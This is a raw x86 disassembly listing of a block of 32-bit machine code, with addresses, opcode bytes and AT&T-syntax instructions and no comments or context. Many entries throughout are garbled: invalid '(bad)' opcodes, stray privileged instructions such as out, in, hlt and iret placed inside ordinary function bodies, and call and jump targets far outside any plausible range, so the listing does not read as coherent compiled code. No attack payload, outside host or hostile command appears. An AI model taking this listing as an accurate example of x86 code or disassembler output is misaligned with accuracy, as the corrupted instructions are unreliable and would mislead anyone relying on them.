  406ca3:	8b c8                	mov    %eax,%ecx
  406ca5:	4f                   	dec    %edi
  406ca6:	e1 04                	loope  0x406cac
  406ca8:	2b c8                	sub    %eax,%ecx
  406caa:	f7 d9                	neg    %ecx
  406cac:	c1 e1 02             	shl    $0x2,%ecx
  406caf:	89 4b 28             	mov    %ecx,0x28(%ebx)
  406cb2:	33 c0                	xor    %eax,%eax
  406cb4:	5b                   	pop    %ebx
  406cb5:	8b e5                	mov    %ebp,%esp
  406cb7:	5d                   	pop    %ebp
  406cb8:	c2 0c 00             	ret    $0xc
  406cbb:	8b 95 20 ff ff ff    	mov    -0xe0(%ebp),%edx
  406cc1:	8b 85 74 ee ff ff    	mov    -0x118c(%ebp),%eax
  406cc7:	4d                   	dec    %ebp
  406cc8:	c2 89 4b             	ret    $0x4b89
  406ccb:	24 8b                	and    $0x8b,%al
  406ccd:	c8 3f c1 e1          	enter  $0xc13f,$0xe1
  406cd1:	04 2b                	add    $0x2b,%al
  406cd3:	25 5e 61 d9 c1       	and    $0xc1d9615e,%eax
  406cd8:	e2 00                	loop   0x406cda
  406cda:	89 db                	mov    %ebx,%ebx
  406cdc:	28 33                	sub    %dh,(%ebx)
  406cde:	6b 5b 8b e5          	imul   $0xffffffe5,-0x75(%ebx),%ebx
  406ce2:	5d                   	pop    %ebp
  406ce3:	c2 0c 00             	ret    $0xc
  406ce6:	8b 85 20 ff 71 ff    	mov    -0x8e00e0(%ebp),%eax
  406cec:	89 4b 24             	mov    %ecx,0x24(%ebx)
  406cef:	8b d0                	mov    %eax,%edx
  406cf1:	ef                   	out    %eax,(%dx)
  406cf2:	e2 04                	loop   0x406cf8
  406cf4:	93                   	xchg   %eax,%ebx
  406cf5:	d0 a5 da 85 9a fe    	shlb   $1,-0x1657a26(%ebp)
  406cfb:	89 53 28             	mov    %edx,0x28(%ebx)
  406cfe:	5f                   	pop    %edi
  406cff:	5e                   	pop    %esi
  406d00:	33 c0                	xor    %eax,%eax
  406d02:	5b                   	pop    %ebx
  406d03:	e2 e5                	loop   0x406cea
  406d05:	5d                   	pop    %ebp
  406d06:	c2 0c 00             	ret    $0xc
  406d09:	90                   	nop
  406d0a:	90                   	nop
  406d0b:	90                   	nop
  406d0c:	90                   	nop
  406d0d:	90                   	nop
  406d0e:	8f                   	(bad)
  406d0f:	90                   	nop
  406d10:	55                   	push   %ebp
  406d11:	8b ec                	mov    %esp,%ebp
  406d13:	a1 40 05 41 00       	mov    0x410540,%eax
  406d18:	85 c0                	test   %eax,%eax
  406d1a:	75 2a                	jne    0x406d46
  406d1c:	35 40 04 c8 49       	xor    $0x49c80440,%eax
  406d21:	ff 15 80 c0 40 00    	call   *0x40c080
  406d27:	a3 ec 04 41 00       	mov    %eax,0x4104ec
  406d2c:	8b 45 08             	mov    0x8(%ebp),%eax
  406d2f:	e7 05                	out    %eax,$0x5
  406d31:	40                   	inc    %eax
  406d32:	05 ab e5 01 00       	add    $0x1e5ab,%eax
  406d37:	00 04 c7             	add    %al,(%edi,%eax,8)
  406d3a:	00 36                	add    %dh,(%esi)
  406d3c:	e2 41                	loop   0x406d7f
  406d3e:	00 a1 ec 04 41 00    	add    %ah,0x4104ec(%ecx)
  406d44:	74 c3                	je     0x406d09
  406d46:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406d49:	c7 01 40 30 41 00    	movl   $0x413040,(%ecx)
  406d4f:	a1 ec 04 41 16       	mov    0x164104ec,%eax
  406d54:	5d                   	pop    %ebp
  406d55:	c3                   	ret
  406d56:	90                   	nop
  406d57:	90                   	nop
  406d58:	90                   	nop
  406d59:	f4                   	hlt
  406d5a:	df 90 90 90 90 90    	fists  -0x6f6f6f70(%eax)
  406d60:	55                   	push   %ebp
  406d61:	8b ec                	mov    %esp,%ebp
  406d63:	8b ae 0c 3b a7 08    	mov    0x8a73b0c(%esi),%ebp
  406d69:	6a 00                	push   $0x0
  406d6b:	68 49 03 40 00       	push   $0x400349
  406d70:	50                   	push   %eax
  406d71:	51                   	push   %ecx
  406d72:	e2 19                	loop   0x406d8d
  406d74:	48                   	dec    %eax
  406d75:	00 00                	add    %al,(%eax)
  406d77:	50                   	push   %eax
  406d78:	ff 15 90 c0 40 00    	call   *0x40c090
  406d7e:	67 c2 08 00          	addr16 ret $0x8
  406d82:	de 90 90 90 2c 90    	ficoms -0x6fd36f70(%eax)
  406d88:	90                   	nop
  406d89:	90                   	nop
  406d8a:	7e 5d                	jle    0x406de9
  406d8c:	2e 90                	cs nop
  406d8e:	90                   	nop
  406d8f:	0d 55 8b ec 8b       	or     $0x8bec8b55,%eax
  406d94:	45                   	inc    %ebp
  406d95:	10 56 8b             	adc    %dl,-0x75(%esi)
  406d98:	75 5a                	jne    0x406df4
  406d9a:	62 8b 64 08 8b 48    	bound  %ecx,0x488b0864(%ebx)
  406da0:	20 8b 50 60 56 57    	and    %cl,0x57566050(%ebx)
  406da6:	e1 52                	loope  0x406dfa
  406da8:	e8 e3 3f 00 00       	call   0x40ad90
  406dad:	83 01 10             	addl   $0x10,(%ecx)
  406db0:	7b c0                	jnp    0x406d72
  406db2:	75 0b                	jne    0x406dbf
  406db4:	5f                   	pop    %edi
  406db5:	b8 1c 00 00 00       	mov    $0x1c,%eax
  406dba:	5e                   	pop    %esi
  406dbb:	ec                   	in     (%dx),%al
  406dbc:	c2 0c 00             	ret    $0xc
  406dbf:	c6                   	(bad)
  406dc0:	e8 37 7c 00 5f       	call   0x5f40e9fc
  406dc5:	6c                   	insb   (%dx),%es:(%edi)
  406dc6:	c0 5e 5d c2          	rcrb   $0xc2,0x5d(%esi)
  406dca:	0c 00                	or     $0x0,%al
  406dcc:	90                   	nop
  406dcd:	90                   	nop
  406dce:	90                   	nop
  406dcf:	90                   	nop
  406dd0:	55                   	push   %ebp
  406dd1:	8b ec                	mov    %esp,%ebp
  406dd3:	53                   	push   %ebx
  406dd4:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  406dd7:	17                   	pop    %ss
  406dd8:	8b 75 08             	mov    0x8(%ebp),%esi
  406ddb:	57                   	push   %edi
  406ddc:	8b 7d 10             	mov    0x10(%ebp),%edi
  406ddf:	8d 85 ff 13 5e 10    	lea    0x105e13ff(%ebp),%eax
  406de5:	66 89 5e 5c          	mov    %bx,0x5c(%esi)
  406de9:	74 0f                	je     0x406dfa
  406deb:	57                   	push   %edi
  406dec:	ff 15 a8 c1 40 00    	call   *0x40c1a8
  406df2:	66 77 9f             	data16 ja 0x406d94
  406df5:	2a 66 89             	sub    -0x77(%esi),%ah
  406df8:	7e 0c                	jle    0x406e06
  406dfa:	83 41 02 75          	addl   $0x75,0x2(%ecx)
  406dfe:	18 b8 10 5f 00 00    	sbb    %bh,0x5f10(%eax)
  406e04:	c7 46 18 04 5f 00 00 	movl   $0x5f04,0x18(%esi)
  406e0b:	4b                   	dec    %ebx
  406e0c:	3a 14 89             	cmp    (%ecx,%ecx,4),%dl
  406e0f:	46                   	inc    %esi
  406e10:	1c 8d                	sbb    $0x8d,%al
  406e12:	46                   	inc    %esi
  406e13:	2c 89                	sub    $0x89,%al
  406e15:	46                   	inc    %esi
  406e16:	20 5f 9c             	and    %bl,-0x64(%edi)
  406e19:	7f 5d                	jg     0x406e78
  406e1b:	c3                   	ret
  406e1c:	90                   	nop
  406e1d:	90                   	nop
  406e1e:	90                   	nop
  406e1f:	2c 55                	sub    $0x55,%al
  406e21:	b7 ec                	mov    $0xec,%bh
  406e23:	8b fc                	mov    %esp,%edi
  406e25:	56                   	push   %esi
  406e26:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406e29:	8b 5e 10             	mov    0x10(%esi),%ebx
  406e2c:	53                   	push   %ebx
  406e2d:	8b 5d 94             	mov    -0x6c(%ebp),%ebx
  406e30:	56                   	push   %esi
  406e31:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  406e37:	ab                   	stos   %eax,%es:(%edi)
  406e38:	c7                   	(bad)
  406e39:	ca 00 00             	lret   $0x0
  406e3c:	00 00                	add    %al,(%eax)
  406e3e:	8b fb                	mov    %ebx,%edi
  406e40:	83 c9 ff             	or     $0xffffffff,%ecx
  406e43:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406e44:	c0 66 c7 02          	shlb   $0x2,-0x39(%esi)
  406e48:	00 00                	add    %al,(%eax)
  406e4a:	f2 d0 f7             	repnz shl $1,%bh
  406e4d:	d1 49 03             	rorl   $1,0x3(%ecx)
  406e50:	f8                   	clc
  406e51:	86 ff                	xchg   %bh,%bh
  406e53:	3b 7b e4             	cmp    -0x1c(%ebx),%edi
  406e56:	fe                   	(bad)
  406e57:	13 3c a1             	adc    (%ecx,%eiz,4),%edi
  406e5a:	74 c1                	je     0x406e1d
  406e5c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406e5d:	00 83 55 01 1b 12    	add    %al,0x121b0155(%ebx)
  406e63:	33 c9                	xor    %ecx,%ecx
  406e65:	da 09                	fimull (%ecx)
  406e67:	8a 0f                	mov    (%edi),%cl
  406e69:	dd ff                	(bad)
  406e6b:	15 68 c1 40 00       	adc    $0x40c168,%eax
  406e70:	83 c4 08             	add    $0x8,%esp
  406e73:	eb 1d                	jmp    0x406e92
  406e75:	a1 78 1d 40 00       	mov    0x401d78,%eax
  406e7a:	33 d2                	xor    %edx,%edx
  406e7c:	8a 17                	mov    (%edi),%dl
  406e7e:	8b 08                	mov    (%eax),%ecx
  406e80:	8a 04 51             	mov    (%ecx,%edx,2),%al
  406e83:	ca e0 04             	lret   $0x4e0
  406e86:	85 c0                	test   %eax,%eax
  406e88:	74 07                	je     0x406e91
  406e8a:	7b 3b                	jnp    0x406ec7
  406e8c:	fb                   	sti
  406e8d:	73 ca                	jae    0x406e59
  406e8f:	eb 04                	jmp    0x406e95
  406e91:	3b fb                	cmp    %ebx,%edi
  406e93:	73 24                	jae    0x406eb9
  406e95:	4e                   	dec    %esi
  406e96:	ff 50 6c             	call   *0x6c(%eax)
  406e99:	c1 40 a2 49          	roll   $0x49,-0x5e(%eax)
  406e9d:	c4 04 83             	les    (%ebx,%eax,4),%eax
  406ea0:	cf                   	iret
  406ea1:	01 7c 23 b1          	add    %edi,-0x4f(%ebx,%eiz,1)
  406ea5:	ff 86 44 00 fc 1c    	incl   0x1cfc0044(%esi)
  406eab:	8b 48 88             	mov    -0x78(%eax),%ecx
  406eae:	5f                   	pop    %edi
  406eaf:	5e                   	pop    %esi
  406eb0:	5b                   	pop    %ebx
  406eb1:	66 89 02             	mov    %ax,(%edx)
  406eb4:	33 c0                	xor    %eax,%eax
  406eb6:	5d                   	pop    %ebp
  406eb7:	33 14 9c             	xor    (%esp,%ebx,4),%edx
  406eba:	ae                   	scas   %es:(%edi),%al
  406ebb:	3f                   	aas
  406ebc:	3a 75 36             	cmp    0x36(%ebp),%dh
  406ebf:	76 fe                	jbe    0x406ebf
  406ec1:	78 32                	js     0x406ef5
  406ec3:	3b fb                	cmp    %ebx,%edi
  406ec5:	75 0c                	jne    0x406ed3
  406ec7:	5f                   	pop    %edi
  406ec8:	5e                   	pop    %esi
  406ec9:	b8 34 00 00 e9       	mov    $0xe9000034,%eax
  406ece:	5b                   	pop    %ebx
  406ecf:	5d                   	pop    %ebp
  406ed0:	c2 14 00             	ret    $0x14
  406ed3:	8d 47 01             	lea    0x1(%edi),%eax
  406ed6:	48                   	dec    %eax
  406ed7:	8a 15 03 c1 52 00    	mov    0x52c103,%dl
  406edd:	83 c4 04             	add    $0x4,%esp
  406ee0:	83 f8 4a             	cmp    $0x4a,%eax
  406ee3:	7c e2                	jl     0x406ec7
  406ee5:	3d ff ff 00 00       	cmp    $0xffff,%eax
  406eea:	7f db                	jg     0x406ec7
  406eec:	3c 4d                	cmp    $0x4d,%al
  406eee:	74 cf                	je     0x406ebf
  406ef0:	b0 ff                	mov    $0xff,%al
  406ef2:	66 89 01             	mov    %ax,(%ecx)
  406ef5:	2b f3                	sub    %ebx,%esi
  406ef7:	8b c3                	mov    %ebx,%eax
  406ef9:	31 46 9f             	xor    %eax,-0x61(%esi)
  406efc:	de 8d 53 01 29 50    	fimuls 0x50290153(%ebp)
  406f02:	e8 49 db ff ff       	call   0x404a50
  406f07:	d3 55 08             	rcll   %cl,0x8(%ebp)
  406f0a:	b8 75 14 8b cb       	mov    $0xcb8b1475,%eax
  406f0f:	ce                   	into
  406f10:	f8                   	clc
  406f11:	d7                   	xlat   %ds:(%ebx)
  406f12:	02 8b c1 c1 e9 81    	add    -0x7e163e3f(%ebx),%cl
  406f18:	07                   	pop    %es
  406f19:	c3                   	ret
  406f1a:	8b c8                	mov    %eax,%ecx
  406f1c:	83 86 03 33 80 f3 a4 	addl   $0xffffffa4,-0xc7fccfd(%esi)
  406f23:	8b 0a                	mov    (%edx),%ecx
  406f25:	5f                   	pop    %edi
  406f26:	5e                   	pop    %esi
  406f27:	c6 04 0b 00          	movb   $0x0,(%ebx,%ecx,1)
  406f2b:	5b                   	pop    %ebx
  406f2c:	0e                   	push   %cs
  406f2d:	c2 14 e2             	ret    $0xe214
  406f30:	55                   	push   %ebp
  406f31:	8b ec                	mov    %esp,%ebp
  406f33:	8b 4d 86             	mov    -0x7a(%ebp),%ecx
  406f36:	8b 55 08             	mov    0x8(%ebp),%edx
  406f39:	8b c1                	mov    %ecx,%eax
  406f3b:	56                   	push   %esi
  406f3c:	8b 75 2b             	mov    0x2b(%ebp),%esi
  406f3f:	83 e0 03             	and    $0x3,%eax
  406f42:	57                   	push   %edi
  406f43:	c7 c0 68 00 00 00    	mov    $0x68,%eax
  406f49:	74 2b                	je     0x406f76
  406f4b:	85 90 74 1c 8b 90    	test   %edx,-0x6f74e38c(%eax)
  406f51:	10 85 ff 75 15 e6    	adc    %al,-0x19ea8a01(%ebp)
  406f57:	f8                   	clc
  406f58:	03 74 01 f6          	add    -0xa(%ecx,%eax,1),%esi
  406f5c:	c1 02 74             	roll   $0x74,(%edx)
  406f5f:	1d 5f b8 85 11       	sbb    $0x1185b85f,%eax
  406f64:	01 00                	add    %eax,(%eax)
  406f66:	e3 09                	jecxz  0x406f71
  406f68:	3e 18 00             	sbb    %al,%ds:(%eax)
  406f6b:	5f                   	pop    %edi
  406f6c:	ff 16                	call   *(%esi)
  406f6e:	b9 00 00 5e 5d       	mov    $0x5d5e0000,%ecx
  406f73:	c2 18 00             	ret    $0x18
  406f76:	8c 45 03             	mov    %es,0x3(%ebp)
  406f79:	85 c0                	test   %eax,%eax
  406f7b:	75 05                	jne    0x406f82
  406f7d:	b8 02 ca 00 00       	mov    $0xca02,%eax
  406f82:	8b 7d 1c             	mov    0x1c(%ebp),%edi
  406f85:	4a                   	dec    %edx
  406f86:	51                   	push   %ecx
  406f87:	8b e4                	mov    %esp,%esp
  406f89:	14 51                	adc    $0x51,%al
  406f8b:	e5 fb                	in     $0xfb,%eax
  406f8d:	52                   	push   %edx
  406f8e:	e8 bb b1 00 00       	call   0x41214e
  406f93:	83 c4 18             	add    $0x18,%esp
  406f96:	5f                   	pop    %edi
  406f97:	5e                   	pop    %esi
  406f98:	5d                   	pop    %ebp
  406f99:	26 18 8f 90 90 90 90 	sbb    %cl,%es:-0x6f6f6f70(%edi)
  406fa0:	41                   	inc    %ecx
  406fa1:	8b ec                	mov    %esp,%ebp
  406fa3:	83 ec fa             	sub    $0xfffffffa,%esp
  406fa6:	53                   	push   %ebx
  406fa7:	28 8b 75 0c 33 db    	sub    %cl,-0x24ccf38b(%ebx)
  406fad:	57                   	push   %edi
  406fae:	f3 57                	repz push %edi
  406fb0:	89 75 f4             	mov    %esi,-0xc(%ebp)
  406fb3:	75 15                	jne    0x406fca
  406fb5:	be 40 63 40 00       	mov    $0x406340,%esi
  406fba:	44                   	inc    %esp
  406fbb:	98                   	cwtl
  406fbc:	3c 30                	cmp    $0x30,%al
  406fbe:	0f ec b9 00 0c 00 48 	paddsb 0x48000c00(%ecx),%mm7
  406fc5:	39 69 f7             	cmp    %ebp,-0x9(%ecx)
  406fc8:	81 00 00 87 68 34    	addl   $0x34688700,(%eax)
  406fce:	f4                   	hlt
  406fcf:	ab                   	stos   %eax,%es:(%edi)
  406fd0:	00 56 f4             	add    %dl,-0xc(%esi)
  406fd3:	ce                   	into
  406fd4:	1c d6                	sbb    $0xd6,%al
  406fd6:	40                   	inc    %eax
  406fd7:	00 b1 d0 87 fe 83    	add    %dh,-0x7c017830(%ecx)
  406fdd:	c9                   	leave
  406fde:	ff 33                	push   (%ebx)
  406fe0:	c0 83 c4 08 f2 1a d0 	rolb   $0xd0,0x1af208c4(%ebx)
  406fe7:	d1 49 ed             	rorl   $1,-0x13(%ecx)
  406fea:	35 0f 85 8c 00       	xor    $0x8c850f,%eax
  406fef:	00 00                	add    %al,(%eax)
  406ff1:	56                   	push   %esi
  406ff2:	ff 15 93 c1 4d 00    	call   *0x4dc193
  406ff8:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406ffb:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406ffe:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  407001:	f1                   	int1
  407002:	55                   	push   %ebp
  407003:	dc fa                	fdivr  %st,%st(2)
  407005:	45                   	inc    %ebp
  407006:	18 89 9a 83 89 4d    	sbb    %cl,0x4d89839a(%ecx)
  40700c:	e8 89 55 ea e8       	call   0xe92ac59a
  407011:	45                   	inc    %ebp
  407012:	0c 28                	or     $0x28,%al
  407014:	48                   	dec    %eax
  407015:	0c 39                	or     $0x39,%al
  407017:	19 0f                	sbb    %ecx,(%edi)
  407019:	84 a8 00 00 00 89    	test   %ch,-0x77000000(%eax)
  40701f:	5d                   	pop    %ebp
  407020:	fc                   	cld
  407021:	8b 55 1c             	mov    0x1c(%ebp),%edx
  407024:	6a 38                	push   $0x38
  407026:	52                   	push   %edx
  407027:	e8 34 da ff 28       	call   0x29404a60
  40702c:	8b f8                	mov    %eax,%edi
  40702e:	33 c0                	xor    %eax,%eax
  407030:	5d                   	pop    %ebp
  407031:	f7 46 0e 00 00 c4 f3 	testl  $0xf3c40000,0xe(%esi)
  407038:	ab                   	stos   %eax,%es:(%edi)
  407039:	8b 45 33             	mov    0x33(%ebp),%eax
  40703c:	52                   	push   %edx
  40703d:	52                   	push   %edx
  40703e:	31 8b 7d e8 89 06    	xor    %ecx,0x689e87d(%ebx)
  407044:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407045:	51                   	push   %ecx
  407046:	0c 8b                	or     $0x8b,%al
  407048:	04 17                	add    $0x17,%al
  40704a:	8b 1c 14             	mov    (%esp,%edx,1),%ebx
  40704d:	52                   	push   %edx
  40704e:	05 02 8b 08 4e       	add    $0x4e088b02,%eax
  407053:	89 44 2c 0b          	mov    %eax,0xb(%esp,%ebp,1)
  407057:	75 fd                	jne    0x407056
  407059:	ff 63 83             	jmp    *-0x7d(%ebx)
  40705c:	fe 0c 85 db 75 43 5d 	decb   0x5d4375db(,%eax,4)
  407063:	58                   	pop    %eax
  407064:	f4                   	hlt
  407065:	f0 c0 74 0d 50 8b    	lock shlb $0x8b,0x50(%ebp,%ecx,1)
  40706b:	45                   	inc    %ebp
  40706c:	1c 50                	sbb    $0x50,%al
  40706e:	e8 dd e7 04 ff       	call   0xff455850
  407073:	7a 46                	jp     0x4070bb
  407075:	04 8b                	add    $0x8b,%al
  407077:	4d                   	dec    %ebp
  407078:	08 89 31 eb 31 56    	or     %cl,0x5631eb31(%ecx)
  40707e:	ff 15 ac c1 a9 00    	call   *0xa9c1ac
  407084:	3b c3                	cmp    %ebx,%eax
  407086:	89 45 0c             	mov    %eax,0xc(%ebp)
  407089:	75 2e                	jne    0x4070b9
  40708b:	8b 35 86 c1 d4 00    	mov    0xd4c186,%esi
  407091:	ff d6                	call   *%esi
  407093:	85 c0                	test   %eax,%eax
  407095:	74 2f                	je     0x4070c6
  407097:	ff c4                	inc    %esp
  407099:	5f                   	pop    %edi
  40709a:	5e                   	pop    %esi
  40709b:	91                   	xchg   %eax,%ecx
  40709c:	80 1b 0a             	sbbb   $0xa,(%ebx)
  40709f:	00 5b 8b             	add    %bl,-0x75(%ebx)
  4070a2:	d1 4c c3 8b          	rorl   $1,-0x75(%ebx,%eax,8)
  4070a6:	53                   	push   %ebx
  4070a7:	04 89                	add    $0x89,%al
  4070a9:	0d 04 89 73 24       	or     $0x24738904,%eax
  4070ae:	8b 45 0c             	mov    0xc(%ebp),%eax
  4070b1:	83 75 04 8b          	xorl   $0xffffff8b,0x4(%ebp)
  4070b5:	f2 89 7d fc          	repnz mov %edi,-0x4(%ebp)
  4070b9:	8b 48 0c             	mov    0xc(%eax),%ecx
  4070bc:	95                   	xchg   %eax,%ebp
  4070bd:	3c 0f                	cmp    $0xf,%al
  4070bf:	00 0f                	add    %cl,(%edi)
  4070c1:	9a 5b ff ff ff 4d 5e 	lcall  $0x5e4d,$0xffffff5b
  4070c8:	33 13                	xor    (%ebx),%edx
  4070ca:	5b                   	pop    %ebx
  4070cb:	8b 1f                	mov    (%edi),%ebx
  4070cd:	95                   	xchg   %eax,%ebp
  4070ce:	c3                   	ret
  4070cf:	55                   	push   %ebp
  4070d0:	55                   	push   %ebp
  4070d1:	39 ec                	cmp    %ebp,%esp
  4070d3:	81 ec 54 02 00 00    	sub    $0x254,%esp
  4070d9:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4070dc:	53                   	push   %ebx
  4070dd:	56                   	push   %esi
  4070de:	33 f6                	xor    %esi,%esi
  4070e0:	8b 01                	mov    (%ecx),%eax
  4070e2:	8b 43 04             	mov    0x4(%ebx),%eax
  4070e5:	89 45 eb             	mov    %eax,-0x15(%ebp)
  4070e8:	cd 45                	int    $0x45
  4070ea:	10 57 4a             	adc    %dl,0x4a(%edi)
  4070ed:	75 ec                	jne    0x4070db
  4070ef:	8a 00                	mov    (%eax),%al
  4070f1:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4070f4:	84 e2                	test   %ah,%dl
  4070f6:	89 75 e0             	mov    %esi,-0x20(%ebp)
  4070f9:	89 64 f3 89          	mov    %esp,-0x77(%ebx,%esi,8)
  4070fd:	53                   	push   %ebx
  4070fe:	d8 89 fb dc 62 84    	fmuls  -0x7b9d2305(%ecx)
  407104:	aa                   	stos   %al,%es:(%edi)
  407105:	0a 00                	or     (%eax),%al
  407107:	00 e0                	add    %ah,%al
  407109:	5d                   	pop    %ebp
  40710a:	14 3c                	adc    $0x3c,%al
  40710c:	25 74 3c 8b 45       	and    $0x458b3c74,%eax
  407111:	95                   	xchg   %eax,%ebp
  407112:	85 c0                	test   %eax,%eax
  407114:	74 3f                	je     0x407155
  407116:	3b 45 dc             	cmp    -0x24(%ebp),%eax
  407119:	72 1c                	jb     0x407137
  40711b:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40711e:	57                   	push   %edi
  40711f:	59                   	pop    %ecx
  407120:	9b                   	fwait
  407121:	ff 55 f1             	call   *-0xf(%ebp)
  407124:	83 5c 04 85 c0       	sbbl   $0xffffffc0,-0x7b(%esp,%eax,1)
  407129:	0f 85 94 0a 00 6a    	jne    0x6a407bc3
  40712f:	8b 4f 04             	mov    0x4(%edi),%ecx
  407132:	8b d4                	mov    %esp,%edx
  407134:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  407137:	8b 55 10             	mov    0x10(%ebp),%edx
  40713a:	2f                   	das
  40713b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40713e:	8a 0a                	mov    (%edx),%cl
  407140:	b9 48 3b ff 45       	mov    $0x45ff3b48,%ecx
  407145:	49                   	dec    %ecx
  407146:	e9 54 0a 33 00       	jmp    0x737b9f
  40714b:	8b 7d 10             	mov    0x10(%ebp),%edi
  40714e:	8b 0d 74 c1 40 00    	mov    0x40c174,%ecx
  407154:	b8 01 45 00 5c       	mov    $0x5c004501,%eax
  407159:	33 d5                	xor    %ebp,%edx
  40715b:	47                   	inc    %edi
  40715c:	39 01                	cmp    %eax,(%ecx)
  40715e:	89 45 26             	mov    %eax,0x26(%ebp)
  407161:	89 45 e9             	mov    %eax,-0x17(%ebp)
  407164:	89 55 c8             	mov    %edx,-0x38(%ebp)
  407167:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  40716a:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  40716d:	1a 45 17             	sbb    0x17(%ebp),%al
  407170:	20 88 55 fb 89 7d    	and    %cl,0x7d89fb55(%eax)
  407176:	10 6d 12             	adc    %ch,0x12(%ebp)
  407179:	8a 34 6a             	mov    (%edx,%ebp,2),%dh
  40717c:	02 52 c8             	add    -0x38(%edx),%dl
  40717f:	4d                   	dec    %ebp
  407180:	8b c1                	mov    %ecx,%eax
  407182:	40                   	inc    %eax
  407183:	00 83 7f d6 33 d2    	add    %al,-0x2dcc2981(%ebx)
  407189:	eb 12                	jmp    0x40719d
  40718b:	8b 0d 78 c1 40 00    	mov    0x40c178,%ecx
  407191:	43                   	inc    %ebx
  407192:	c0 8a 07 8b f0 0a 63 	rorb   $0x63,0xaf08b07(%edx)
  407199:	41                   	inc    %ecx
  40719a:	83 e0 98             	and    $0xffffff98,%eax
  40719d:	3b c2                	cmp    %edx,%eax
  40719f:	0f 85 c9 01 75 00    	jne    0xb5736e
  4071a5:	b9 b1 00 00 dc       	mov    $0xdc0000b1,%ecx
  4071aa:	a3 cc 3c 55 75       	mov    %eax,0x75553ccc
  4071af:	06                   	push   %es
  4071b0:	89 55 c0             	mov    %edx,-0x40(%ebp)
  4071b3:	47                   	inc    %edi
  4071b4:	eb f4                	jmp    0x4071aa
  4071b6:	3c 2b                	cmp    $0x2b,%al
  4071b8:	75 06                	jne    0x4071c0
  4071ba:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  4071bd:	47                   	inc    %edi
  4071be:	56                   	push   %esi
  4071bf:	ea 3c c7 00 06 89 7c 	ljmp   $0x7c89,$0x600c73c
  4071c6:	d4 47                	aam    $0x47
  4071c8:	eb e0                	jmp    0x4071aa
  4071ca:	63 13                	arpl   %edx,(%ebx)
  4071cc:	ac                   	lods   %ds:(%esi),%al
  4071cd:	0a 89 4d c8 47 eb    	or     -0x14b837b3(%ecx),%cl
  4071d3:	d6                   	salc
  4071d4:	3c 30                	cmp    $0x30,%al
  4071d6:	75 06                	jne    0x4071de
  4071d8:	88 45 17             	mov    %al,0x17(%ebp)
  4071db:	47                   	inc    %edi
  4071dc:	ca cc a1             	lret   $0xa1cc
  4071df:	74 07                	je     0x4071e8
  4071e1:	40                   	inc    %eax
  4071e2:	08 5b 7d             	or     %bl,0x7d(%ebx)
  4071e5:	10 39                	adc    %bh,(%ecx)
  4071e7:	08 7e 14             	or     %bh,0x14(%esi)
  4071ea:	33 c9                	xor    %ecx,%ecx
  4071ec:	6a 04                	push   $0x4
  4071ee:	8a 0f                	mov    (%edi),%cl
  4071f0:	51                   	push   %ecx
  4071f1:	ff 85 68 c1 40 00    	incl   0x40c168(%ebp)
  4071f7:	83 c4 f7             	add    $0xfffffff7,%esp
  4071fa:	33 d2                	xor    %edx,%edx
  4071fc:	eb 12                	jmp    0x407210
  4071fe:	88 0d 78 a1 63 00    	mov    %cl,0x63a178
  407204:	12 c0                	adc    %al,%al
  407206:	2b 22                	sub    (%edx),%esp
  407208:	8b 9e 8a 04 f2 83    	mov    -0x7c0dfb76(%esi),%ebx
  40720e:	32 04 3b             	xor    (%ebx,%edi,1),%al
  407211:	c2 50 5d             	ret    $0x5d50
  407214:	0f 03 f5             	lsl    %ebp,%esi
  407217:	83 51 51 47          	adcl   $0x47,0x51(%ecx)
  40721b:	89 97 10 8b 15 74    	mov    %edx,0x74158b10(%edi)
  407221:	c1 40 00 89          	roll   $0x89,0x0(%eax)
  407225:	4d                   	dec    %ebp
  407226:	e0 83                	loopne 0x4071ab
  407228:	3a d8                	cmp    %al,%bl
  40722a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40722b:	15 33 c0 6a 04       	adc    $0x46ac033,%eax
  407230:	8a 0c 83             	mov    (%ebx,%eax,4),%cl
  407233:	ff 15 68 c1 40 00    	call   *0x40c168
  407239:	8b e8                	mov    %eax,%ebp
  40723b:	e0 83                	loopne 0x4071c0
  40723d:	c4 08                	les    (%eax),%ecx
  40723f:	eb 11                	jmp    0x407252
  407241:	a1 78 c1 0b 00       	mov    0xbc178,%eax
  407246:	33 d2                	xor    %edx,%edx
  407248:	8a 17                	mov    (%edi),%dl
  40724a:	73 65                	jae    0x4072b1
  40724c:	8a 04 50             	mov    (%eax,%edx,2),%al
  40724f:	83 e0 04             	and    $0x4,%eax
  407252:	33 53 3b             	xor    0x3b(%ebx),%edx
  407255:	c2 74 0d             	ret    $0xd74
  407258:	94                   	xchg   %eax,%esp
  407259:	be 17 8d 0c 45       	mov    $0x450c8d17,%esi
  40725e:	f8                   	clc
  40725f:	8d 4c 4a d0          	lea    -0x30(%edx,%ecx,2),%ecx
  407263:	eb 73                	jmp    0x4072d8
  407265:	89 7d 10             	mov    %edi,0x10(%ebp)
  407268:	c7 45 cc 01 00 00 00 	movl   $0x1,-0x34(%ebp)
  40726f:	eb 26                	jmp    0x407297
  407271:	80 3f 2a             	cmpb   $0x2a,(%edi)
  407274:	75 0e                	jne    0x407284
  407276:	8b 03                	mov    (%ebx),%eax
  407278:	83 c3 0e             	add    $0xe,%ebx
  40727b:	47                   	inc    %edi
  40727c:	3b c2                	cmp    %edx,%eax
  40727e:	89 7d 10             	mov    %edi,0x10(%ebp)
  407281:	c7                   	(bad)
  407282:	72 83                	jb     0x407207
  407284:	01 00                	add    %eax,(%eax)
  407286:	00 00                	add    %al,(%eax)
  407288:	7d 05                	jge    0x40728f
  40728a:	89 11                	mov    %edx,(%ecx)
  40728c:	c0 f7 c3             	shl    $0xc3,%bh
